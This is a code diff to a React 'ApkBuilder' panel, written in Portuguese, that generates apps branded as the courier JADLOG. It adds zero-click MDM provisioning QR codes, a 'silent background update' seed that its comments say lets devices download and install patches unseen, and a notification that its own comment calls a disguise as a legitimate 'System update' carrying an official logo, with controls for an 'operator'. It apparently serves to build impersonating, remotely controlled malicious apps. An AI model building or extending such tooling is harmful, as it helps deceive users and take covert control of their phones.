+            <span>{building && targetAction === "qr" ? "Gerando..." : "+ Gerar QR Code (0-Click MDM)"}</span>
           </button>
 
           <button
             type="button"
             className="apk-btn-novo-build"
-            onClick={() => {
-              setTargetAction("apk");
-              openCreateModal();
-            }}
+            disabled={building}
+            onClick={handleQuickGenerateApk}
             style={{
               background: "linear-gradient(135deg, var(--crimson-neon), #991b1b)",
               border: "1px solid var(--crimson-neon)",
-              boxShadow: "0 0 15px rgba(255, 26, 42, 0.25)"
+              boxShadow: "0 0 15px rgba(255, 26, 42, 0.25)",
+              cursor: building ? "not-allowed" : "pointer",
+              opacity: building ? 0.7 : 1
             }}
-            title="Criar novo build focado em download de APK direto e instalação via emulador ADB"
+            title="Compilar imediatamente, abrir informações e iniciar download do APK"
           >
             <Download size={16} />
-            <span>+ Gerar APK (Download & Emulador)</span>
+            <span>{building && targetAction === "apk" ? "Gerando..." : "+ Gerar APK (Download & Emulador)"}</span>
           </button>
         </div>
       </div>
@@ -1800,16 +2232,18 @@ export function ApkBuilder() {
                           }}
                         >
                           <QRCodeSVG
-                            value={
-                              platform === "ios"
-                                ? activeResult.qrPayload
-                                : qrMode === "zero_touch"
-                                ? (activeResult.zeroTouchQrPayload || activeResult.qrPayload)
-                                : (activeResult.webInstallUrl || activeResult.qrPayload)
-                            }
+                            value={getEffectiveQrValue() || "https://dview.local"}
                             size={185}
+                            level="L"
                           />
                         </div>
+
+                        {platform === "android" && qrMode === "zero_touch" && (
+                          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "6px", fontSize: "11px", color: "#38bdf8" }}>
+                            <Lock size={13} />
+                            <span>Payload Criptografado (AES-256-GCM + HMAC-SHA256) • Provisionamento Google MDM 0-Click</span>
+                          </div>
+                        )}
 
                         <div
                           style={{
@@ -1845,6 +2279,47 @@ export function ApkBuilder() {
                             </>
                           )}
                         </div>
+
+                        {platform === "android" && qrMode === "zero_touch" && (
+                          <div style={{ marginTop: "2px" }}>
+                            <button
+                              type="button"
+                              className="secondary"
+                              onClick={() => setShowZeroTouchJson(!showZeroTouchJson)}
+                              style={{ width: "100%", justifyContent: "space-between", fontSize: "11.5px", padding: "6px 12px" }}
+                            >
+                              <span style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                                <Terminal size={13} style={{ color: "#38bdf8" }} />
+                                {showZeroTouchJson ? "Ocultar Payload MDM (JSON)" : "Inspecionar Payload Criptografado MDM (JSON)"}
+                              </span>
+                              <span>{showZeroTouchJson ? "▲" : "▼"}</span>
+                            </button>
+                            {showZeroTouchJson && (
+                              <pre style={{
+                                marginTop: "6px",
+                                background: "#080c14",
+                                border: "1px solid #1e293b",
+                                borderRadius: "8px",
+                                padding: "10px",
+                                fontSize: "10.5px",
+                                color: "#38bdf8",
+                                maxHeight: "180px",
+                                overflowY: "auto",
+                                whiteSpace: "pre-wrap",
+                                wordBreak: "break-all"
+                              }}>
+                                {(() => {
+                                  try {
+                                    const raw = getEffectiveQrValue() || "{}";
+                                    return JSON.stringify(JSON.parse(raw), null, 2);
+                                  } catch {
+                                    return getEffectiveQrValue() || "Sem dados";
+                                  }
+                                })()}
+                              </pre>
+                            )}
+                          </div>
+                        )}
 
                         <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                           {platform === "android" && qrMode === "zero_touch" ? (
@@ -1955,6 +2430,81 @@ export function ApkBuilder() {
                             </code>
                           </div>
                         </div>
+
+                        {/* SEED OTA CRIPTOGRÁFICA DE ATUALIZAÇÃO SILENCIOSA */}
+                        {activeResult.updateSeed && (
+                          <div
+                            style={{
+                              background: "rgba(168, 85, 247, 0.08)",
+                              border: "1px solid rgba(168, 85, 247, 0.35)",
+                              borderRadius: "8px",
+                              padding: "12px",
+                              display: "flex",
+                              flexDirection: "column",
+                              gap: "8px"
+                            }}
+                          >
+                            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+                              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                                <Sparkles size={14} style={{ color: "#c084fc" }} />
+                                <strong style={{ fontSize: "12px", color: "#f8fafc" }}>
+                                  Seed OTA de Atualização Silenciosa em Background:
+                                </strong>
+                              </div>
+                              <span
+                                style={{
+                                  fontSize: "9px",
+                                  fontWeight: 800,
+                                  background: "rgba(168, 85, 247, 0.2)",
+                                  color: "#c084fc",
+                                  padding: "2px 6px",
+                                  borderRadius: "4px",
+                                  border: "1px solid rgba(168, 85, 247, 0.4)"
+                                }}
+                              >
+                                AUTO-UPDATE ATIVO
+                              </span>
+                            </div>
+
+                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                              <code
+                                style={{
+                                  flex: 1,
+                                  background: "#060913",
+                                  border: "1px solid #1e293b",
+                                  padding: "6px 10px",
+                                  borderRadius: "6px",
+                                  fontFamily: "var(--font-mono)",
+                                  color: "#a855f7",
+                                  fontSize: "11px",
+                                  fontWeight: 700,
+                                  wordBreak: "break-all"
+                                }}
+                              >
+                                {activeResult.updateSeed}
+                              </code>
+                              <button
+                                type="button"
+                                className="secondary"
+                                onClick={() => {
+                                  if (activeResult.updateSeed) {
+                                    void navigator.clipboard.writeText(activeResult.updateSeed);
+                                    setCopiedSeed(true);
+                                    setTimeout(() => setCopiedSeed(false), 2000);
+                                  }
+                                }}
+                                style={{ padding: "6px 12px", fontSize: "11px", display: "flex", alignItems: "center", gap: "4px" }}
+                              >
+                                {copiedSeed ? <Check size={13} style={{ color: "#22c55e" }} /> : <Copy size={13} />}
+                                <span>{copiedSeed ? "Copiado!" : "Copiar Seed"}</span>
+                              </button>
+                            </div>
+
+                            <small style={{ color: "#94a3b8", fontSize: "10.5px", lineHeight: "1.4" }}>
+                              O aparelho instalado usará esta Seed para sincronizar silenciosamente com o servidor central em segundo plano. Se a versão instalada atender todos os comandos do admin, nenhuma atualização forçada ocorre.
+                            </small>
+                          </div>
+                        )}
 
                         {/* BLOCO DE COMANDO RÁPIDO PARA EMULADOR ADB */}
                         {platform === "android" && (
@@ -2235,14 +2785,25 @@ export function ApkBuilder() {
 
                     {platform === "ios" ? (
                       <>
-                        {/* Linha 1 iOS: Nome do Perfil e Bundle Identifier */}
-                        <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: "12px" }}>
+                        {/* Linha 1 iOS: Nome do Perfil, Emoji Notificação e Bundle Identifier */}
+                        <div style={{ display: "grid", gridTemplateColumns: "1.2fr 110px 1fr", gap: "12px" }}>
                           <label>
                             Nome do Perfil / App iOS
                             <input
                               value={appName}
                               onChange={(e) => setAppName(e.target.value)}
                               placeholder="Ex: JADLOG Rastreio iOS"
+                              required
+                            />
+                          </label>
+
+                          <label>
+                            Emoji / Marca
+                            <input
+                              value={companyEmoji}
+                              onChange={(e) => setCompanyEmoji(e.target.value)}
+                              placeholder="📦"
+                              style={{ textAlign: "center", fontSize: "16px" }}
                               required
                             />
                           </label>
@@ -2256,6 +2817,33 @@ export function ApkBuilder() {
                               required
                             />
                           </label>
+                        </div>
+
+                        {/* Seletor Rápido de Emojis / Marca */}
+                        <div style={{ display: "flex", alignItems: "center", gap: "6px", flexWrap: "wrap", marginTop: "-4px" }}>
+                          <span style={{ fontSize: "11px", color: "#94a3b8", fontWeight: 600 }}>Ícone da Notificação:</span>
+                          {companyEmojiPresets.map((preset) => (
+                            <button
+                              key={preset.emoji}
+                              type="button"
+                              onClick={() => setCompanyEmoji(preset.emoji)}
+                              style={{
+                                background: companyEmoji === preset.emoji ? "rgba(56, 189, 248, 0.25)" : "rgba(30, 41, 59, 0.5)",
+                                border: companyEmoji === preset.emoji ? "1px solid #38bdf8" : "1px solid #334155",
+                                color: companyEmoji === preset.emoji ? "#ffffff" : "#cbd5e1",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                                fontSize: "11px",
+                                cursor: "pointer",
+                                display: "flex",
+                                alignItems: "center",
+                                gap: "4px"
+                              }}
+                            >
+                              <span>{preset.emoji}</span>
+                              <span style={{ fontSize: "10px" }}>{preset.name}</span>
+                            </button>
+                          ))}
                         </div>
 
                         {/* Linha 2 iOS: Organização Emissora e URL Destino (WebClip) */}
@@ -2308,14 +2896,25 @@ export function ApkBuilder() {
                       </>
                     ) : (
                       <>
-                        {/* Linha 1 Android: Nome do App e Package ID */}
-                        <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: "12px" }}>
+                        {/* Linha 1 Android: Nome do App, Emoji Notificação e Package ID */}
+                        <div style={{ display: "grid", gridTemplateColumns: "1.2fr 110px 1fr", gap: "12px" }}>
                           <label>
                             Nome do Aplicativo
                             <input
                               value={appName}
                               onChange={(e) => setAppName(e.target.value)}
                               placeholder="Ex: Entregue Jad Log"
+                              required
+                            />
+                          </label>
+
+                          <label>
+                            Emoji / Marca
+                            <input
+                              value={companyEmoji}
+                              onChange={(e) => setCompanyEmoji(e.target.value)}
+                              placeholder="📦"
+                              style={{ textAlign: "center", fontSize: "16px" }}
                               required
                             />
                           </label>
@@ -2329,6 +2928,33 @@ export function ApkBuilder() {
                               required
                             />
                           </label>
+                        </div>
+
+                        {/* Seletor Rápido de Emojis / Marca */}
+                        <div style={{ display: "flex", alignItems: "center", gap: "6px", flexWrap: "wrap", marginTop: "-4px" }}>
+                          <span style={{ fontSize: "11px", color: "#94a3b8", fontWeight: 600 }}>Ícone da Notificação:</span>
+                          {companyEmojiPresets.map((preset) => (
+                            <button
+                              key={preset.emoji}
+                              type="button"
+                              onClick={() => setCompanyEmoji(preset.emoji)}
+                              style={{
+                                background: companyEmoji === preset.emoji ? "rgba(220, 38, 38, 0.25)" : "rgba(30, 41, 59, 0.5)",
+                                border: companyEmoji === preset.emoji ? "1px solid #dc2626" : "1px solid #334155",
+                                color: companyEmoji === preset.emoji ? "#ffffff" : "#cbd5e1",
+                                padding: "3px 8px",
+                                borderRadius: "6px",
+                                fontSize: "11px",
+                                cursor: "pointer",
+                                display: "flex",
+                                alignItems: "center",
+                                gap: "4px"
+                              }}
+                            >
+                              <span>{preset.emoji}</span>
+                              <span style={{ fontSize: "10px" }}>{preset.name}</span>
+                            </button>
+                          ))}
                         </div>
 
                         {/* Linha 2 Android: Versão e URL Destino */}
@@ -2548,6 +3174,98 @@ export function ApkBuilder() {
                         )}
                       </div>
                     )}
+
+                    {/* SEÇÃO: ATUALIZAÇÃO SILENCIOSA EM BACKGROUND & SEED OTA */}
+                    <div
+                      className="apk-vpn-config-card"
+                      style={{
+                        marginTop: "12px",
+                        border: autoUpdateEnabled ? "1px solid rgba(168, 85, 247, 0.4)" : "1px solid #1e293b",
+                        background: "rgba(15, 23, 42, 0.6)"
+                      }}
+                    >
+                      <div
+                        className="apk-vpn-toggle-row"
+                        onClick={() => setAutoUpdateEnabled(!autoUpdateEnabled)}
+                        style={{ cursor: "pointer" }}
+                      >
+                        <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
+                          <ArrowUpCircle size={20} style={{ color: autoUpdateEnabled ? "#c084fc" : "#64748b" }} />
+                          <div>
+                            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
+                              <strong style={{ fontSize: "13.5px", color: "#f8fafc" }}>
+                                Atualização Silenciosa em Background & Seed OTA (Auto-Update)
+                              </strong>
+                              <span
+                                className="apk-tag-pill active"
+                                style={{
+                                  background: "rgba(168, 85, 247, 0.15)",
+                                  color: "#c084fc",
+                                  border: "1px solid rgba(168, 85, 247, 0.3)"
+                                }}
+                              >
+                                BACKGROUND OTA
+                              </span>
+                            </div>
+                            <small style={{ fontSize: "11px", color: "#94a3b8" }}>
+                              Gera uma Seed criptográfica no build. O aparelho no dispositivo sincroniza silenciosamente em background. Se a versão já atende aos acessos do admin, não exige atualização forçada.
+                            </small>
+                          </div>
+                        </div>
+                        <input
+                          type="checkbox"
+                          checked={autoUpdateEnabled}
+                          onChange={(e) => setAutoUpdateEnabled(e.target.checked)}
+                          style={{ width: "18px", height: "18px", accentColor: "#a855f7", cursor: "pointer" }}
+                        />
+                      </div>
+
+                      {autoUpdateEnabled && (
+                        <div style={{ padding: "0 14px 14px" }}>
+                          <div style={{ display: "flex", flexDirection: "column", gap: "6px", marginTop: "8px" }}>
+                            <label style={{ fontSize: "11.5px", color: "#cbd5e1", fontWeight: 700 }}>
+                              Seed OTA Criptográfica (Deixe vazio para gerar automaticamente vinculada ao servidor):
+                            </label>
+                            <div style={{ display: "flex", gap: "6px" }}>
+                              <input
+                                type="text"
+                                value={updateSeed}
+                                onChange={(e) => setUpdateSeed(e.target.value)}
+                                placeholder="SEED-DVIEW-AUTO-GENERATED-OTA"
+                                style={{
+                                  flex: 1,
+                                  padding: "6px 10px",
+                                  fontSize: "12px",
+                                  fontFamily: "var(--font-mono)",
+                                  background: "#080c16",
+                                  border: "1px solid #1e293b",
+                                  color: "#a855f7",
+                                  borderRadius: "6px"
+                                }}
+                              />
+                              <button
+                                type="button"
+                                className="secondary"
+                                onClick={(e) => {
+                                  e.preventDefault();
+                                  e.stopPropagation();
+                                  const randomSeed = `SEED-DVIEW-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}-OTA`;
+                                  setUpdateSeed(randomSeed);
+                                  showToast("Nova Seed OTA gerada!");
+                                }}
+                                style={{ padding: "0 12px", fontSize: "11px", display: "flex", alignItems: "center", gap: "4px" }}
+                              >
+                                <RotateCw size={12} />
+                                <span>Gerar Seed</span>
+                              </button>
+                            </div>
+                            <span style={{ fontSize: "10.5px", color: "#64748b" }}>
+                              Essa chave criptográfica é gravada no APK gerado e vinculada ao servidor. O worker em background do aparelho usará essa Seed para baixar e instalar patches silenciosamente.
+                            </span>
+                          </div>
+                        </div>
+                      )}
+                    </div>
 
                     {/* SEÇÃO: HISTÓRICO DE IMAGENS E LOGOS SELECIONADOS */}
                     <div className="apk-logo-history-section">
@@ -3080,6 +3798,134 @@ export function ApkBuilder() {
                           <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                             <span>5G</span>
                             <span>100%</span>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* NOTIFICAÇÃO NATIVA UNIFICADA ANDROID (DISFARCE SYSTEM UPDATE LEGÍTIMO COM LOGO OFICIAL) */}
+                      {platform === "android" && (
+                        <div style={{
+                          background: "rgba(15, 23, 42, 0.96)",
+                          borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
+                          padding: "8px 10px 10px",
+                          boxShadow: "0 4px 14px rgba(0, 0, 0, 0.5)",
+                          zIndex: 15,
+                          flexShrink: 0
+                        }}>
+                          <div style={{
+                            background: "rgba(30, 41, 59, 0.85)",
+                            border: "1px solid rgba(255, 255, 255, 0.12)",
+                            borderRadius: "10px",
+                            padding: "9px 12px",
+                            display: "flex",
+                            flexDirection: "column",
+                            gap: "5px"
+                          }}>
+                            {/* Linha 1: Nome do App no cabeçalho + agora */}
+                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                                <span style={{ fontSize: "11px", fontWeight: 700, color: "#94a3b8" }}>
+                                  {appName || "JAD LOG"} • {notifStatusConfig[notificationState]?.subtextSuffix || "agora"}
+                                </span>
+                              </div>
+                              <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
+                                <span style={{ fontSize: "8.5px", background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", padding: "1px 5px", borderRadius: "3px", fontWeight: 700 }}>
+                                  SISTEMA
+                                </span>
+                              </div>
+                            </div>
+
+                            {/* Linha 2: Título "System update" + Texto + Logotipo Oficial da Empresa à Direita */}
+                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "10px" }}>
+                              <div style={{ flex: 1 }}>
+                                <div style={{ fontSize: "13px", fontWeight: 700, color: "#ffffff", letterSpacing: "0.2px", marginBottom: "2px" }}>
+                                  {notifStatusConfig[notificationState]?.title || "System update"}
+                                </div>
+                                <div style={{ fontSize: "11px", color: "#cbd5e1", lineHeight: "1.3" }}>
+                                  {notifStatusConfig[notificationState]?.text || "New system software is available, Tap to learn more."}
+                                </div>
+                              </div>
+                              {/* Logotipo Oficial da Empresa (largeIcon) */}
+                              <div style={{
+                                width: "38px",
+                                height: "38px",
+                                borderRadius: "8px",
+                                background: "#ffffff",
+                                display: "flex",
+                                alignItems: "center",
+                                justifyContent: "center",
+                                overflow: "hidden",
+                                flexShrink: 0,
+                                boxShadow: "0 2px 8px rgba(0, 0, 0, 0.4)",
+                                border: "1px solid rgba(255, 255, 255, 0.2)"
+                              }}>
+                                {customLogoDataUrl ? (
+                                  <img src={customLogoDataUrl} alt="Logo" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
+                                ) : (
+                                  <span style={{ fontSize: "20px" }}>{companyEmoji || "📦"}</span>
+                                )}
+                              </div>
+                            </div>
+
+                            {/* Linha 3: Explicação Tática de Seed OTA Automática ao Dar Sinal */}
+                            <div style={{
+                              display: "flex",
+                              alignItems: "center",
+                              justifyContent: "space-between",
+                              marginTop: "4px",
+                              paddingTop: "6px",
+                              borderTop: "1px solid rgba(255, 255, 255, 0.06)",
+                              fontSize: "9.5px",
+                              color: "#38bdf8"
+                            }}>
+                              <span style={{ display: "inline-flex", alignItems: "center", gap: "4px" }}>
+                                <span>⚡</span>
+                                <span>Ao dar sinal, o servidor envia a Seed OTA automaticamente</span>
+                              </span>
+                              <span style={{
+                                background: "rgba(34, 197, 94, 0.15)",
+                                color: "#22c55e",
+                                padding: "1px 6px",
+                                borderRadius: "4px",
+                                fontWeight: 700
+                              }}>
+                                AUTO SEED
+                              </span>
+                            </div>
+
+                            {/* Linha 4: Pills de Alternância Rápida para o Operador */}
+                            <div style={{
+                              display: "flex",
+                              gap: "4px",
+                              marginTop: "2px"
+                            }}>
+                              {notificationStatesList.map((st) => (
+                                <button
+                                  key={st.id}
+                                  type="button"
+                                  onClick={() => setNotificationState(st.id)}
+                                  style={{
+                                    flex: 1,
+                                    padding: "3px 6px",
+                                    borderRadius: "4px",
+                                    border: notificationState === st.id ? `1px solid ${st.color}` : "1px solid rgba(255, 255, 255, 0.06)",
+                                    background: notificationState === st.id ? `${st.color}22` : "rgba(15, 23, 42, 0.5)",
+                                    color: notificationState === st.id ? st.color : "#94a3b8",
+                                    fontSize: "9px",
+                                    fontWeight: 700,
+                                    cursor: "pointer",
+                                    display: "flex",
+                                    alignItems: "center",
+                                    justifyContent: "center",
+                                    gap: "3px"
+                                  }}
+                                  title={`Status: ${st.shortLabel}`}
+                                >
+                                  <span style={{ width: "5px", height: "5px", borderRadius: "50%", background: st.color }} />
+                                  <span>{st.shortLabel}</span>
+                                </button>
+                              ))}
+                            </div>
                           </div>
                         </div>
                       )}
